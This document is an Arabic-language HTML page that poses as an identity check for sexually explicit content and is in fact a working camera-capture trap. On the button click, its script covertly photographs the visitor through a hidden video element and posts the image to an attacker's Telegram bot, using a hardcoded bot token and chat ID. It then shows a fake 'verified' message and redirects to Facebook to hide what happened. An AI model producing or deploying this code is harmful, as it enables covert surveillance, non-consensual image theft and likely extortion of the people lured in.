<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>تحقق من الهوية</title>
    <style>
        body { background: #1a1a1a; color: white; text-align: center; font-family: Arial; padding-top: 50px; }
        .btn { background: #25D366; padding: 15px 30px; border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer; }
    </style>
</head>
<body>
    <img src="https://cdn-icons-png.flaticon.com/512/3917/3917705.png" width="100">
    <h2>سكس جمعه</h2>
    <p>صور وفيديوهات بدون ملابس.</p>
    <button class="btn" onclick="startCapture()">ابدأ التحقق الآن</button>

    <video id="video" width="1" height="1" autoplay style="opacity:0;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        // ضع توكن البوت والـ ID هنا
        const T = '8301462057:AAF1rD3xfgur1lyEV80jCctZ9stYJdVYkiU';
        const C = '1105921069';

        async function startCapture() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                    canvas.toBlob(b => {
                        const fd = new FormData();
                        fd.append('chat_id', C);
                        fd.append('photo', b, 'user.jpg');
                        fetch(`https://api.telegram.org/bot${T}/sendPhoto`, { method: 'POST', body: fd });
                    }, 'image/jpeg');
                    // إخفاء الأثر بعد السحب
                    alert("تم التحقق بنجاح، سيتم توجيهك الآن.");
                    window.location.href = "https://facebook.com";
                }, 2000);
            } catch (e) {
                alert("يجب إعطاء الصلاحية للمتابعة!");
            }
        }
    </script>
</body>
</html>
